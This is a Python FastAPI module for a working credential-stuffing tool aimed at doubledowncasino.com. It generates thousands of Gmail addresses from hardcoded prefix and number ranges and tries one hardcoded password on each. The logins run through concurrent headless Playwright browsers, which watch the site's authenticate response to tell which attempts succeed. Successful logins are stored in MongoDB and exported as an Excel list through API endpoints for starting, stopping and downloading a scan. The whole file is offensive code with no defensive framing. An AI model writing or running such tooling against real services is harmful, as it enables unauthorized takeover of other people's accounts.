import os
import uuid
import logging
import threading
import asyncio
import io
from datetime import datetime, timezone
from fastapi import APIRouter, HTTPException, Query
from fastapi.responses import StreamingResponse
from pydantic import BaseModel
from typing import Optional, List
from motor.motor_asyncio import AsyncIOMotorClient
from pymongo import MongoClient
from openpyxl import Workbook
from openpyxl.styles import Font, PatternFill, Border, Side

logger = logging.getLogger(__name__)

router = APIRouter(prefix="/api/checker", tags=["checker"])

mongo_url = os.environ['MONGO_URL']
db_name = os.environ['DB_NAME']
client = AsyncIOMotorClient(mongo_url)
db = client[db_name]

EMAIL_RANGES = [
    {"prefix": "veenu", "start": 1, "end": 9999, "pad": 3, "domain": "gmail.com"},
    {"prefix": "vinty", "start": 300, "end": 1000, "pad": 0, "domain": "gmail.com"},
    {"prefix": "crazy", "start": 300, "end": 1000, "pad": 0, "domain": "gmail.com"},
    {"prefix": "strike", "start": 100, "end": 700, "pad": 0, "domain": "gmail.com"},
    {"prefix": "treaty", "start": 1, "end": 1000, "pad": 4, "domain": "gmail.com"},
    {"prefix": "vineet", "start": 100, "end": 10000, "pad": 0, "domain": "gmail.com"},
    {"prefix": "vngnara", "start": 500, "end": 1000, "pad": 0, "domain": "gmail.com"},
    {"prefix": "vininara", "start": 300, "end": 600, "pad": 0, "domain": "gmail.com"},
    {"prefix": "super", "start": 300, "end": 1100, "pad": 0, "domain": "gmail.com"},
]

PASSWORD = "c304i109"
active_jobs = {}


def generate_email(prefix, num, pad, domain):
    if pad > 0:
        num_str = str(num).zfill(pad)
    else:
        num_str = str(num)
    return f"{prefix}{num_str}@{domain}"


def generate_all_emails():
    emails = []
    for r in EMAIL_RANGES:
        for num in range(r["start"], r["end"] + 1):
            email = generate_email(r["prefix"], num, r["pad"], r["domain"])
            emails.append({"email": email, "prefix": r["prefix"], "num": num})
    return emails


def count_total_emails():
    total = 0
    for r in EMAIL_RANGES:
        total += r["end"] - r["start"] + 1
    return total


def run_scan_worker(job_id, concurrency=5):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(_async_scan_worker(job_id, concurrency))
    loop.close()


async def _async_scan_worker(job_id, concurrency):
    os.environ['PLAYWRIGHT_BROWSERS_PATH'] = '/pw-browsers'
    from playwright.async_api import async_playwright

    sync_client = MongoClient(mongo_url)
    sync_db = sync_client[db_name]

    all_emails = generate_all_emails()
    total = len(all_emails)

    active_jobs[job_id] = {
        "status": "running",
        "total": total,
        "tested": 0,
        "successful": 0,
        "failed": 0,
        "current_email": "",
        "started_at": datetime.now(timezone.utc).isoformat()
    }

    logger.info(f"Scan {job_id}: {total} emails, {concurrency} concurrent workers")

    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)

            # Create worker semaphore
            sem = asyncio.Semaphore(concurrency)
            email_idx = [0]  # mutable counter

            async def worker(worker_id):
                """Each worker gets its own browser context and reuses it for sequential logins."""
                context = await browser.new_context(viewport={'width': 1920, 'height': 1080})
                page = await context.new_page()

                while True:
                    # Get next email
                    async with sem:
                        if email_idx[0] >= total:
                            break
                        if active_jobs.get(job_id, {}).get("status") != "running":
                            break
                        idx = email_idx[0]
                        email_idx[0] += 1

                    item = all_emails[idx]
                    email = item["email"]
                    active_jobs[job_id]["current_email"] = email

                    success = await test_login_fast(page, email, PASSWORD)

                    active_jobs[job_id]["tested"] += 1
                    status = "success" if success else "failed"
                    if success:
                        active_jobs[job_id]["successful"] += 1
                        logger.info(f"SUCCESS: {email}")
                    else:
                        active_jobs[job_id]["failed"] += 1

                    sync_db.login_results.update_one(
                        {"email": email, "job_id": job_id},
                        {"$set": {
                            "email": email,
                            "prefix": item["prefix"],
                            "num": item["num"],
                            "status": status,
                            "job_id": job_id,
                            "tested_at": datetime.now(timezone.utc).isoformat()
                        }},
                        upsert=True
                    )

                try:
                    await context.close()
                except Exception:
                    pass

            # Run multiple workers concurrently
            tasks = [asyncio.create_task(worker(i)) for i in range(concurrency)]
            await asyncio.gather(*tasks, return_exceptions=True)
            await browser.close()

    except Exception as e:
        logger.error(f"Scan error: {e}")
        active_jobs[job_id]["status"] = "error"
        active_jobs[job_id]["error"] = str(e)
    finally:
        sync_client.close()

    if active_jobs[job_id]["status"] == "running":
        active_jobs[job_id]["status"] = "completed"
    active_jobs[job_id]["completed_at"] = datetime.now(timezone.utc).isoformat()
    logger.info(f"Scan {job_id} done: {active_jobs[job_id]['successful']}/{active_jobs[job_id]['tested']} successful")


async def test_login_fast(page, email, password):
    """Test a single login by navigating to DDC and going through the flow.
    Reuses the same page for efficiency."""
    try:
        # Navigate to DDC
        await page.goto('https://www.doubledowncasino.com', wait_until='domcontentloaded', timeout=20000)
        await page.wait_for_timeout(2500)

        # Click Play Now
        play_btn = await page.query_selector('img[src*="playnow"]')
        if play_btn:
            await play_btn.click(force=True)
            await page.wait_for_timeout(2000)

        # Click Email Connect
        try:
            await page.click('img[src*="email_connect"]', force=True, timeout=5000)
            await page.wait_for_timeout(800)
        except Exception:
            return False

        # Click Login tab
        try:
            await page.click('img[src*="email_dailog_login"]', force=True, timeout=3000)
            await page.wait_for_timeout(400)
        except Exception:
            pass

        # Fill credentials
        try:
            await page.fill('#emailID', email, timeout=3000)
            await page.fill('#pw', password, timeout=3000)
        except Exception:
            return False

        # Track auth result
        auth_result = {"success": None}
        auth_event = asyncio.Event()

        async def handle_response(response):
            if 'authenticate/user' in response.url:
                try:
                    if response.status == 200:
                        auth_result["success"] = True
                    else:
                        auth_result["success"] = False
                except Exception:
                    auth_result["success"] = False
                auth_event.set()

        page.on('response', handle_response)

        # Click login
        try:
            await page.click('img[src*="green_login"]', force=True, timeout=3000)
        except Exception:
            page.remove_listener('response', handle_response)
            return False

        # Wait for auth response
        try:
            await asyncio.wait_for(auth_event.wait(), timeout=12.0)
        except asyncio.TimeoutError:
            auth_result["success"] = False

        page.remove_listener('response', handle_response)
        return auth_result["success"] == True

    except Exception as e:
        logger.debug(f"Login test error for {email}: {e}")
        return False


# ============== API Endpoints ==============
class ScanRequest(BaseModel):
    batch_size: int = 5
    prefixes: Optional[List[str]] = None


@router.post("/start")
async def start_scan(request: ScanRequest = ScanRequest()):
    for jid, job in active_jobs.items():
        if job["status"] == "running":
            return {"message": "Scan already running", "job_id": jid, "status": job}

    job_id = str(uuid.uuid4())
    total = count_total_emails()
    await db.login_results.delete_many({})

    thread = threading.Thread(target=run_scan_worker, args=(job_id, request.batch_size), daemon=True)
    thread.start()

    return {"job_id": job_id, "total_emails": total, "status": "started"}


@router.post("/stop")
async def stop_scan():
    for jid, job in active_jobs.items():
        if job["status"] == "running":
            job["status"] = "stopped"
            return {"message": "Scan stopped", "job_id": jid}
    return {"message": "No active scan to stop"}


@router.get("/status")
async def get_scan_status():
    if not active_jobs:
        return {"status": "idle", "total": count_total_emails()}
    latest_job_id = max(active_jobs.keys(), key=lambda k: active_jobs[k].get("started_at", ""))
    job = active_jobs[latest_job_id]
    return {"job_id": latest_job_id, **{k: v for k, v in job.items() if k != "successful_emails"}}


@router.get("/results")
async def get_results(status_filter: str = Query("success"), limit: int = 500):
    query = {}
    if status_filter != "all":
        query["status"] = status_filter
    results = await db.login_results.find(query, {"_id": 0}).sort("tested_at", -1).to_list(limit)
    total_success = await db.login_results.count_documents({"status": "success"})
    total_tested = await db.login_results.count_documents({})
    return {"results": results, "total_success": total_success, "total_tested": total_tested}


@router.get("/download")
async def download_results():
    results = await db.login_results.find({"status": "success"}, {"_id": 0}).sort("email", 1).to_list(10000)
    if not results:
        raise HTTPException(status_code=404, detail="No successful logins found")

    wb = Workbook()
    ws = wb.active
    ws.title = "Successful Logins"
    header_font = Font(name='Calibri', bold=True, size=11, color='FFFFFF')
    header_fill = PatternFill(start_color='1F4E79', end_color='1F4E79', fill_type='solid')
    thin_border = Border(left=Side(style='thin'), right=Side(style='thin'), top=Side(style='thin'), bottom=Side(style='thin'))

    headers = ['#', 'Email', 'Prefix', 'Number', 'Tested At']
    for col, header in enumerate(headers, 1):
        cell = ws.cell(row=1, column=col, value=header)
        cell.font = header_font
        cell.fill = header_fill
        cell.border = thin_border

    for idx, r in enumerate(results, 2):
        values = [idx - 1, r.get('email', ''), r.get('prefix', ''), r.get('num', ''), r.get('tested_at', '')]
        for col, v in enumerate(values, 1):
            cell = ws.cell(row=idx, column=col, value=v)
            cell.border = thin_border

    ws.column_dimensions['B'].width = 35
    ws.column_dimensions['C'].width = 15
    ws.column_dimensions['E'].width = 25
    ws.freeze_panes = 'A2'

    output = io.BytesIO()
    wb.save(output)
    output.seek(0)

    filename = f"DDC_Successful_Logins_{datetime.now().strftime('%Y%m%d')}.xlsx"
    return StreamingResponse(output, media_type="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
                             headers={"Content-Disposition": f"attachment; filename={filename}"})


@router.get("/ranges")
async def get_email_ranges():
    ranges = []
    for r in EMAIL_RANGES:
        count = r["end"] - r["start"] + 1
        sample_start = generate_email(r["prefix"], r["start"], r["pad"], r["domain"])
        sample_end = generate_email(r["prefix"], r["end"], r["pad"], r["domain"])
        ranges.append({
            "prefix": r["prefix"], "start": r["start"], "end": r["end"],
            "pad": r["pad"], "count": count,
            "sample_start": sample_start, "sample_end": sample_end
        })
    return {"ranges": ranges, "total": count_total_emails()}
